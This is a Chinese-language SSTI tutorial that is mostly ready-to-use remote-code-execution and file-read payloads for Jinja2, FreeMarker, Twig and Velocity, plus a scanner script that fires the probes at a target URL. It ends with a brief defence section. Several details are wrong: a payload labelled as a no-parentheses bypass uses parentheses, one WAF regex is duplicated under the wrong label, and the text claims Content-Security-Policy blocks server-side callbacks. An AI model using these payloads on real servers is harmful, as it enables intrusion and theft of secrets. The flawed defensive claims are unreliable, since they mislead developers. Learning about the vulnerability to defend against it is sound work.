# SSTI（服务端模板注入）深度

## 概述

SSTI (Server-Side Template Injection) 是 Web 应用中最危险的漏洞之一——一旦利用成功，攻击者可直接在服务器上执行任意代码。它与 XSS 的根本区别在于：SSTI 在服务端执行，无需触发受害者交互。

---

## 1. 漏洞原理与检测矩阵

```
SSTI 检测流程图:

  输入 {{7*7}}
    ├── 返回 49 → SSTI! (Jinja2/Twig)
    ├── 返回 {{7*7}} → 不是 SSTI
    ├── 返回 7777777 → SSTI! (可能)  
    └── 无变化 → 尝试 ${7*7}

  引擎识别:
    {{7*'7'}}    → 7777777: Jinja2, 49: Twig
    ${{7*7}}     → $49: 可能是 FreeMarker
    a{*comment*}b → ab: Smarty
    #{7*7}       → 无输出: 可能是 Pug/Jade
```

---

## 2. 各引擎利用

### Jinja2 (Python)

```python
# 探测
{{7*7}}           # → 49
{{config}}         # → Flask app config (SECRET_KEY 泄露!)
{{self}}           # → TemplateReference object
{{lipsum}}         # → <function generate_lorem_ipsum>

# 对象遍历 → 寻找可利用的类
{{''.__class__.__mro__}}
# 输出: (<class 'str'>, <class 'object'>)

# 查找 subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()}}
# 在输出中搜索: subprocess.Popen

# RCE 链
{{''.__class__.__mro__[1].__subclasses__()[X]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0]}}

# 无括号绕过 (如果 ( ) 被过滤)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# 使用 request 绕过过滤
{{''.__class__.__mro__[2].__subclasses__()[40](request.args.cmd,shell=True,stdout=-1).communicate()}}
# 请求: ?cmd=whoami

# Python 3.10+ 新利用方式
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__['os'].popen('id').read()}}
{{joiner.__init__.__globals__['os'].popen('id').read()}}
```

### FreeMarker (Java)

```java
// 探测
${7*7}      // → 49
${"freemarker".toUpperCase()}  // → FREEMARKER

// RCE 方式 1: Execute 类
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// RCE 方式 2: ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}

// 文件读取
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","/etc/passwd")}
```

### Twig (PHP)

```twig
# 探测
{{7*7}}     # → 49
{{_self}}   # → TemplateReference

# RCE 方式 1: registerUndefinedFilterCallback
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# RCE 方式 2: system
{{['id']|map('system')|join}}

# 文件读取 (PHP 7.4+)
{{include('/etc/passwd')}}

# 代码执行
{{_self.env.setCache(true)}}
{{['system','id']|sort}}
```

### Velocity (Java)

```velocity
# 探测
#set($x=7*7)$x  # → 49

# RCE
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
```

---

## 3. 自动化检测

```python
import requests

class SSTIScanner:
    """SSTI 自动化检测"""

    PROBES = {
        'generic': [
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('<%= 7*7 %>', '49'),
            ('#{7*7}', '49'),
            ('${{7*7}}', '49'),
        ],
        'jinja2': [
            ('{{config}}', 'SECRET_KEY'),
            ('{{self.__class__}}', 'type'),
            ('{{lipsum.__globals__}}', 'globals'),
        ],
        'freemarker': [
            ('${7*7}', '49'),
            ('${"freemarker".toUpperCase()}', 'FREEMARKER'),
        ],
        'twig': [
            ('{{7*"7"}}', '49'),  # Jinja2 返回 7777777
        ],
        'velocity': [
            ('#set($x=7*7)$x', '49'),
        ],
    }

    def __init__(self, target_url):
        self.target = target_url
        self.findings = []

    def test_parameter(self, param_name):
        """测试单个参数"""
        for engine, probes in self.PROBES.items():
            for payload, expected in probes:
                resp = requests.get(self.target, params={
                    param_name: payload
                })

                if expected in resp.text:
                    self.findings.append({
                        'engine': engine,
                        'payload': payload,
                        'confirmed': True,
                        'param': param_name
                    })

                    if engine in ('jinja2', 'freemarker', 'twig'):
                        # 高影响引擎 → 标记为 Critical
                        self.findings[-1]['severity'] = 'CRITICAL'

        return self.findings
```

---

## 4. 防御措施

```python
# 防御层 1: 永远不要拼接用户输入到模板
# ❌ 危险
render_template_string(f"<h1>Hello {name}!</h1>")

# ✅ 安全: 将用户输入作为变量传递
render_template_string("<h1>Hello {{ name }}!</h1>", name=name)

# 防御层 2: 沙箱模板环境
from jinja2 import Environment, BaseLoader
env = Environment(loader=BaseLoader())
# 移出所有内置对象
env.globals.clear()

# 防御层 3: WAF 规则
SSTI_PATTERNS = [
    r'\{\{.*?\}\}',       # {{ ... }}
    r'\$\{.*?\}',         # ${ ... }
    r'<%[=#].*?%>',       # <%= ... %>
    r'\$\{.*?\}',         # #{ ... }
]

# 防御层 4: Content Security Policy
# 即使 SSTI 成功也无法回连外部服务器
# Content-Security-Policy: default-src 'self'
```

---

*上一篇：[反序列化漏洞](10-deserialization.md)*
